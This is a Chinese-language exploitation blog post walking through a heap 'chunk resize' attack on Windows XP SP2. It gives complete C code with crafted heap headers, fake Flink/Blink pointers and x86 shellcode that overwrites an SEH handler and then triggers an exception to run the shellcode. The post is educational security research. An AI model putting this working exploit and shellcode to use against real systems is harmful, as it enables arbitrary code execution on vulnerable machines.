---
layout:		post
title:		利用chunk重设大小攻击堆
author:		wooy0ung
tags:		
category:  	exploit
---


>[分析环境]  
>系统: Windows XP Professional sp2 x86  
>编译器: VC++ 6.0  
>调试器: OllyDbg 1.10  
>注意: 原版的OD没法在FreeList操作指令断下, 可以用吾爱破解OD
>原理: XP系统只有在堆链表删除操作时才尽兴Safe Unlink检查, 那么只要在堆分配时完成劫持, 就不会触发该机制  
<!-- more -->


### 0x00 前期准备

新建一个工程, 贴入以下代码

```
#include "stdafx.h"
#include <stdio.h>
#include <windows.h>
#include <stdlib.h>

char shellcode[]=
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";

int main(int argc, char* argv[])
{
	HLOCAL h1,h2;
	HANDLE hp;

	hp = HeapCreate(0,0x1000,0x10000);
	__asm int 3
	h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,3);
	h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,5);
	memcpy(h1,shellcode,3);
	memcpy(h2,shellcode,5);

	return 0;
}
```

OD附加上去, 单步到完成两次分配

![](/assets/img/exploit/2017-12-31-exploit-by-chunk-resize/0x00.png)

堆表起始于0x00390178, 堆块起始于0x00390680

```
# 第1块
Self Size = 00 04 # 0x04*8=0x20 bytes, 请求3 bytes
Previous chunk Size = 00 08
Cookie = 01
Flags = 07
Unused bytes = 1D # 0x20-0x03=0x1D bytes
Segment index = 00

# 第2块
Self Size = 00 04 # 0x04*8=0x20 bytes, 请求5 bytes
Previous chunk Size = 00 04
Cookie = 05
Flags = 07
Unused bytes = 1B # 0x20-0x05=0x1B bytes
Segment index = 00

# 第3块(空闲大chunk, 未使用)
Self Size = 01 28 # 0x128*8=0x940 bytes, 0x980 - 0x20 * 2 = 0x940
Previous chunk Size = 00 04
Cookie = EE
Flags = 14
Unused bytes = EE
Segment index = 00
```

![](/assets/img/exploit/2017-12-31-exploit-by-chunk-resize/0x01.png)

可以看到这两个chunk的尾部还留有剩余空间, 发现原版OD在调试堆时有问题, 以下该用吾爱破解OD

![](/assets/img/exploit/2017-12-31-exploit-by-chunk-resize/0x02.png)

再重新看一下堆结构

```
# 第1块
Self Size = 00 02 # 0x02*8=0x10 bytes, 请求3 bytes
Previous chunk Size = 00 08
Cookie = 78
Flags = 01
Unused bytes = 0D # 0x10-0x03=0x0D bytes
Segment index = 00

# 第2块
Self Size = 00 02 # 0x02*8=0x10 bytes, 请求5 bytes
Previous chunk Size = 00 02
Cookie = 7A
Flags = 01
Unused bytes = 0B # 0x10-0x05=0x0B bytes
Segment index = 00

# 第3块(空闲大chunk, 未使用)
Self Size = 01 2C # 0x12C*8=0x960 bytes, 0x980 - 0x10 * 2 = 0x960
Previous chunk Size = 00 02
Cookie = 00
Flags = 10
Unused bytes = 00
Segment index = 00
```

![](/assets/img/exploit/2017-12-31-exploit-by-chunk-resize/0x03.png)


### 0x01 exploit

贴入以下代码

```
#include "stdafx.h"
#include <stdio.h>
#include <windows.h>

char shellcode[]=  
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x10\x01\x10\x00\x99\x99\x99\x99"		// Header
"\xEB\x06\x39\x00\xEB\x06\x39\x00"		// Flink Blink
"\x90\x90\x90\x90\x90\x90\x90\x90"  
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"  
"\xEB\x31"		// short jmp
"\x90\x90\x90\x90\x90\x90"  
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"  
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"  
"\x11\x01\x10\x00\x99\x99\x99\x99"		// Header
"\x8C\x06\x39\x00\xE4\xFF\x12\x00"		// fake Flink Blink
"\x90\x90\x90\x90"  
"\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42\x08"
"\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c"
"\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b\x34\xaf\x01"
"\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e\x08\x45\x78\x69"
"\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01"
"\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x67\x20\x20\x01\x68\x79\x30\x75"
"\x6e\x68\x20\x77\x6f\x6f\x89\xe1\xfe\x49\x0b\x31\xc0\x51\x50\xff"
"\xd7";

int main(int argc, char* argv[])
{
	HLOCAL h1,h2;
	HANDLE hp;

	hp = HeapCreate(0,0x1000,0x10000);
	h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,16);
	memcpy(h1,shellcode,300);
	h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,16);
	
	int zero=0;
	zero=1/zero;
	printf("%d",zero);

	return 0;
}
```

单步到完成第一次分配

![](/assets/img/exploit/2017-12-31-exploit-by-chunk-resize/0x04.png)
![](/assets/img/exploit/2017-12-31-exploit-by-chunk-resize/0x05.png)

在0x7c931513处下断

```
lea eax,dword ptr ds:[edi+0x8]		// 获取新chunk的Flink位置
mov dword ptr ss:[ebp-0xF0],eax
mov edx,dword ptr ds:[ecx+0x4]		// 获取下一新chunk中的Blink的值
mov dword ptr ss:[ebp-0xF8],edx
mov dword ptr ds:[eax],ecx 			// 保存新chunk的Flink
mov dword ptr ds:[eax+0x4],edx		// 保存新chunk的Blink
mov dword ptr ds:[edx],eax			// 保存下一chunk中的Blink->Flink的Flink
ov dword ptr ds:[ecx+0x4],eax		// 保存下一chunk中的Blink
```

[0x003A06B8] = 0x003A06EB, 新chunk->Flink = 旧chunk->Flink

![](/assets/img/exploit/2017-12-31-exploit-by-chunk-resize/0x06.png)

[0x003A06B8+4] = 0x0012FFE4, 新chunk->Blink = 旧chunk->Flink->Blink

![](/assets/img/exploit/2017-12-31-exploit-by-chunk-resize/0x07.png)
![](/assets/img/exploit/2017-12-31-exploit-by-chunk-resize/0x08.png)

[0x0012FFE4] = 0x003A06B8, 旧chunk->Flink->Blink->Flink = 新chunk, 触发任意写

![](/assets/img/exploit/2017-12-31-exploit-by-chunk-resize/0x09.png)

现在S.E.H链尾节点的Handler已经改写成堆地址

![](/assets/img/exploit/2017-12-31-exploit-by-chunk-resize/0x0a.png)

[0x003A06EB+4] = 0x003A06B8, 旧chunk->Flink->Blink = 新chunk

![](/assets/img/exploit/2017-12-31-exploit-by-chunk-resize/0x0b.png)

当触发异常, 转入shellcode执行

![](/assets/img/exploit/2017-12-31-exploit-by-chunk-resize/0x0c.png)

pwn~

![](/assets/img/exploit/2017-12-31-exploit-by-chunk-resize/0x0d.png)

最后还有点问题, 吾爱破解OD加载时堆基址是0x003A0000, 直接运行要改成0x00390000